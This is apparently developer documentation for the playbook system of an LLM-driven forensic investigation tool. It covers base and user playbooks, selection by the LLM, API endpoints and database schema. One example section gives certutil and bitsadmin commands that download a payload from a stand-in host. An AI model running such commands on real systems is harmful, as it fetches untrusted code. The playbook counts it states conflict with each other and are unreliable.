# Investigation Playbooks

Investigation playbooks provide strategic guidance for analyzing specific attack scenarios. The system includes 20 built-in playbooks and supports custom user-created playbooks with full CRUD operations.

## Two Types of Playbooks

### 1. Base Playbooks (Immutable)

- **Source**: YAML files in `api/worker/agents/playbooks/`
- **Count**: 20 built-in playbooks
- **Availability**: Always enabled for all investigations
- **Modification**: Cannot be edited or deleted
- **Cloning**: Can be cloned to create custom versions
- **Selection**: LLM automatically selects most relevant playbook

### 2. User Playbooks (Mutable)

- **Source**: Database (`playbooks` table)
- **Management**: Full CRUD via UI and API
- **Availability**: Must be explicitly enabled per investigation
- **Modification**: Can be edited, disabled, or deleted
- **Creation**: Create from scratch or clone from base playbooks
- **Persistence**: Stored in database, survives restarts

## Architecture

### Playbook Loading

**Base Playbooks**:
- Loaded from `api/worker/agents/playbooks/` directory on worker startup
- All `.yaml` files auto-discovered
- Hot-reload: `get_playbook_registry(reload=True)`

**User Playbooks**:
- Loaded from `playbooks` database table
- Filtered by `user_id` and `is_enabled=true`
- Per-investigation filtering via `investigation_playbooks` table

### Selection Process

1. User asks investigation question
2. System loads available playbooks:
   - All base playbooks (always available)
   - User's enabled playbooks
   - Investigation-specific enabled playbooks
3. LLM receives all playbook descriptions
4. LLM selects most relevant playbook (or "none")
5. Selected playbook content injected into agent's system prompt
6. Agent follows playbook guidance during investigation

### Per-Investigation Enablement

Playbooks can be enabled/disabled for specific investigations:

- **Base playbooks**: Always enabled (no database record needed)
- **User playbooks**: Opt-in per investigation via `investigation_playbooks` table
- **Persistence**: Settings persist across sessions and users
- **Flexibility**: Different playbooks for different investigation types

## Base Playbook Categories

### MITRE ATT&CK Tactics (14 playbooks)

Aligned with the MITRE ATT&CK framework:

- `initial_access.yaml` - Phishing, brute force, web exploits
- `execution.yaml` (as `malware_execution.yaml`) - Process creation, suspicious execution
- `persistence.yaml` - Registry keys, scheduled tasks, services
- `privilege_escalation.yaml` - Token manipulation, UAC bypass
- `defense_evasion.yaml` - Log clearing, obfuscation, process injection
- `credential_access.yaml` - LSASS dumping, Mimikatz, Kerberos attacks
- `discovery.yaml` - Reconnaissance, enumeration commands
- `lateral_movement.yaml` - Network logons, PsExec, admin shares
- `collection.yaml` - File archiving, data staging
- `command_and_control.yaml` - Beaconing, DNS tunneling, C2 channels
- `exfiltration.yaml` (as `data_exfiltration.yaml`) - Large transfers, cloud uploads
- `impact.yaml` - Ransomware, data destruction, service disruption
- `resource_development.yaml` - Tool downloads, compilation

### Attack Techniques (7 playbooks)

Focused on specific attack methods:

- `living_off_the_land.yaml` - LOLBin abuse (certutil, bitsadmin, mshta, etc.)
- `fileless_attacks.yaml` - In-memory execution, WMI persistence, process injection
- `golden_silver_tickets.yaml` - Forged Kerberos tickets for persistence
- `dcsync_attack.yaml` - Domain credential replication abuse
- `web_shells.yaml` - Malicious scripts on web servers
- `kerberoasting.yaml` - Service ticket cracking for passwords
- `pass_the_hash.yaml` - NTLM hash authentication without passwords

## Playbook Structure

Each playbook is a YAML file with three required fields:

```yaml
name: playbook_name
description: Brief description shown to LLM for selection

playbook: |
  ## PLAYBOOK TITLE
  
  ### What is [Attack/Technique]?
  Brief explanation of the attack or technique.
  
  ### Key Indicators to Investigate:
  
  1. **Indicator Name (Event IDs)**
     - Description of what to look for
     - Fields: EventData fields to query
     - Query: Specific query examples
     - Red flags: What makes this suspicious
  
  2. **Another Indicator**
     ...
  
  ### Investigation Strategy:
  
  **Phase 1 - Initial Detection**
  - Steps to identify the attack
  
  **Phase 2 - Analysis**
  - Steps to understand scope and impact
  
  **Phase 3 - Correlation**
  - Steps to connect evidence
  
  **Phase 4 - Assessment**
  - Steps to determine remediation needs
  
  ### Common Patterns:
  
  - Pattern descriptions with examples
  
  ### Detection Queries:
  
  ```
  # Example query patterns
  search_events_by_content(value='...', description='...')
  query_jsonb_field(jsonb_path='...', operator='...', value='...')
  ```
  
  ### Key Questions to Answer:
  
  1. Question about detection
  2. Question about scope
  3. Question about impact
  ...
```

## Adding New Playbooks

### Step 1: Create YAML File

Create a new `.yaml` file in `api/worker/agents/playbooks/`:

```yaml
name: my_technique
description: Investigation strategies for detecting [technique] - brief explanation of what it detects

playbook: |
  ## MY TECHNIQUE INVESTIGATION PLAYBOOK
  
  ### What is [Technique]?
  Explanation...
  
  ### Key Indicators to Investigate:
  
  1. **Primary Indicator (Event ID XXXX)**
     - What to look for
     - Fields: EventData.FieldName
     - Query: `search_events_by_content` for 'pattern'
     - Red flags: Suspicious characteristics
  
  ...
```

### Step 2: Reload Playbooks

**In production**: Restart worker container
```bash
docker compose restart worker
```

**In development**: Call reload function
```python
from worker.agents.playbooks import get_playbook_registry
registry = get_playbook_registry(reload=True)
```

### Step 3: Test Selection

Ask a question that should match your playbook:
```
"Investigate [technique] activity"
"Find evidence of [technique]"
```

The LLM will see your playbook description and select it if relevant.

## Writing Effective Playbooks

### Description Field

The description is critical for LLM selection. Make it:

**Specific**: Include key terms the LLM should match
```yaml
# Good
description: Investigation strategies for detecting Kerberoasting attacks - requesting service tickets to crack service account passwords offline

# Bad
description: Kerberos stuff
```

**Actionable**: Focus on what the playbook helps investigate
```yaml
# Good
description: Investigation strategies for detecting web shells - malicious scripts uploaded to web servers for remote access

# Bad
description: Web server security issues
```

### Playbook Content

Make playbooks:

**Specific**: Include exact event IDs, field names, query examples
```markdown
### Event ID 4769 - Service Ticket Requests
- Fields: EventData.ServiceName, EventData.TicketEncryptionType
- Query: `query_jsonb_field` with jsonb_path='EventData.TicketEncryptionType', value='0x17'
```

**Actionable**: Tell the agent what to do
```markdown
### Investigation Strategy:

**Phase 1 - Detect Activity**
- Query Event 4769 for bulk service ticket requests
- Aggregate by TargetUserName to find users requesting many tickets
```

**Example-rich**: Show concrete patterns
```markdown
### Common Commands:
- `certutil.exe -urlcache -f http://malicious.com/payload.exe`
- `bitsadmin.exe /transfer job http://malicious.com/file.exe`
```

## UI-Based Playbook Management

The system includes a full-featured playbook editor accessible at `/playbooks`.

### Features

**Viewing**:
- Browse all playbooks (base + custom)
- Search by name or description
- View playbook content with syntax highlighting
- Markdown rendering with code block support

**Creating**:
- Create custom playbooks from scratch
- Clone base playbooks to create editable copies
- Markdown editor with validation
- Auto-generated unique names for clones

**Editing**:
- Modify name, description, and content
- Real-time validation
- Prevent duplicate names
- Update timestamp tracking

**Managing**:
- Enable/disable playbooks globally
- Delete custom playbooks
- Per-investigation enablement (via API)
- Persistent settings across sessions

### API Endpoints

**Playbook CRUD**:
```bash
# List all playbooks (base + user)
GET /api/v1/playbooks/list

# Get user playbooks only
GET /api/v1/playbooks/user

# Get base playbooks only
GET /api/v1/playbooks/base

# Create playbook
POST /api/v1/playbooks/create
{
  "name": "my_playbook",
  "description": "...",
  "playbook": "...",
  "is_enabled": true
}

# Update playbook
PUT /api/v1/playbooks/{id}
{
  "name": "...",
  "description": "...",
  "playbook": "...",
  "is_enabled": true
}

# Delete playbook
DELETE /api/v1/playbooks/{id}

# Clone base playbook
POST /api/v1/playbooks/clone/{name}
```

**Investigation Control**:
```bash
# Get enabled playbooks for investigation
GET /api/v1/playbooks/investigation/{investigation_id}

# Enable playbook for investigation
POST /api/v1/playbooks/investigation/{investigation_id}/enable
{
  "playbook_id": 1,
  "is_enabled": true
}

# Disable playbook for investigation
DELETE /api/v1/playbooks/investigation/{investigation_id}/disable/{playbook_id}
```

### Database Schema

**playbooks table**:
```sql
CREATE TABLE playbooks (
    playbook_id BIGSERIAL PRIMARY KEY,
    user_id BIGINT NOT NULL REFERENCES users(user_id) ON DELETE CASCADE,
    name TEXT NOT NULL CHECK (length(name) > 0),
    description TEXT NOT NULL CHECK (length(description) > 0),
    playbook TEXT NOT NULL CHECK (length(playbook) > 0),
    is_enabled BOOLEAN NOT NULL DEFAULT true,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
```

**investigation_playbooks table**:
```sql
CREATE TABLE investigation_playbooks (
    id BIGSERIAL PRIMARY KEY,
    investigation_id UUID NOT NULL REFERENCES investigations(investigation_id) ON DELETE CASCADE,
    playbook_id BIGINT NOT NULL REFERENCES playbooks(playbook_id) ON DELETE CASCADE,
    is_enabled BOOLEAN NOT NULL DEFAULT true,
    enabled_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    CONSTRAINT uq_investigation_playbook UNIQUE (investigation_id, playbook_id)
);
```

### Usage Workflow

**Scenario**: Create custom playbook for your environment

1. **Navigate to Playbooks**: Click user menu → Playbooks
2. **Find base playbook**: Search for "lateral movement"
3. **Clone playbook**: Click "Clone" button → Creates "lateral_movement_copy"
4. **Edit clone**: Click "Edit" → Modify for your network
5. **Save**: Playbook now available for all investigations
6. **(Optional) Per-investigation control**: Use API to enable for specific investigations

**Scenario**: Disable playbook temporarily

1. Navigate to Playbooks
2. Find custom playbook
3. Click eye icon to disable
4. Playbook hidden from agent selection
5. Click eye icon again to re-enable

## Debugging

### Check Loaded Playbooks

```python
from worker.agents.playbooks import get_playbook_registry

registry = get_playbook_registry()
for pb in registry.playbooks:
    print(f"{pb.name}: {pb.description}")
```

### Test LLM Selection

```python
from worker.agents.playbooks import select_playbook_for_query
from worker.core import LLMClient

llm = LLMClient(endpoint="...", model="...", api_key="...")
playbook = await select_playbook_for_query(
    "Find evidence of lateral movement",
    llm
)
print(f"Selected: {playbook.name if playbook else 'none'}")
```

### View Selection Prompt

The LLM sees:

```
You are helping select the most relevant forensic investigation playbook.

User's Investigation Question:
Find evidence of lateral movement

Available Investigation Playbooks:

1. **lateral_movement**: Investigation strategies for detecting lateral movement - attackers moving from one system to another
2. **credential_access**: Investigation strategies for detecting credential access - credential dumping, password attacks
...

Respond with ONLY the playbook name (e.g., "lateral_movement") if one is relevant, or "none" if no playbook matches.
```

## Best Practices

### Playbook Naming

- Use lowercase with underscores: `my_technique.yaml`
- Be descriptive: `kerberoasting.yaml` not `kerb.yaml`
- Match technique names: `pass_the_hash.yaml` not `pth.yaml`

### Content Organization

1. **What is it?** - Brief explanation
2. **Key Indicators** - 10+ specific things to look for
3. **Investigation Strategy** - Phased approach
4. **Common Patterns** - Real-world examples
5. **Detection Queries** - Concrete query examples
6. **Key Questions** - What to answer

### Avoiding Overlap

If two playbooks cover similar ground:

- **Merge**: Combine into comprehensive playbook
- **Specialize**: Make each focus on different sub-scenarios
- **Trust LLM**: Let LLM select best match based on question

### Maintenance

- **Review regularly**: Update with new TTPs
- **Test selection**: Ensure LLM selects correctly
- **Update queries**: Match current event schema
- **Add examples**: Include real-world attack patterns

## Current Playbook Inventory

**Base Playbooks**: 20 built-in (14 tactics + 6 techniques)

**MITRE ATT&CK Coverage**: Complete (all 14 tactics)

**Attack Techniques**: 6 focused playbooks for common attack methods

**User Playbooks**: Unlimited (database-backed, per-user)

**Next Steps**: 
- Create custom playbooks for your environment
- Clone and modify base playbooks
- Share playbook best practices with community

## Playbook Management Best Practices

### Organizing Custom Playbooks

**Naming Convention**:
- Use descriptive names: `lateral_movement_finance_dept`
- Include environment: `credential_access_windows_servers`
- Version if needed: `ransomware_detection_v2`

**When to Create Custom Playbooks**:
- Environment-specific indicators (custom applications, unique network topology)
- Industry-specific attacks (financial, healthcare, retail)
- Compliance requirements (PCI-DSS, HIPAA, SOC2)
- Internal tool detection (custom LOLBins, approved software)

**When to Clone Base Playbooks**:
- Need similar structure but different indicators
- Want to add environment-specific context
- Testing modifications before creating from scratch

### Playbook Lifecycle

1. **Create**: Clone base or create from scratch
2. **Test**: Use in investigation, verify effectiveness
3. **Refine**: Update based on results
4. **Share**: Export/document for team use
5. **Maintain**: Update as threats evolve

### Performance Considerations

- **Playbook Size**: Keep under 5000 characters for optimal LLM performance
- **Selection Speed**: More playbooks = slower LLM selection (20-30 is optimal)
- **Disable Unused**: Disable playbooks not relevant to current investigations
- **Database Impact**: Minimal - playbooks loaded once per agent job

---

For questions or suggestions, see the main [documentation index](index.md).
